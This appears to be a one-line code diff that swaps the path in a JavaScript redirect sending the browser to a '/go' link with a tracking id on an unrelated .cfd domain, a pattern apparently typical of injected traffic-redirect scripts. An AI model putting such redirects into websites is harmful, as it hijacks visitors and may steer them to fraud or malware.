@@ -1,1 +1,1 @@
-window.location.href = "https://diplohedron.cfd/Jyn/go?sid=7744";
+window.location.href = "https://diplohedron.cfd/QBUkn/go?sid=7744";
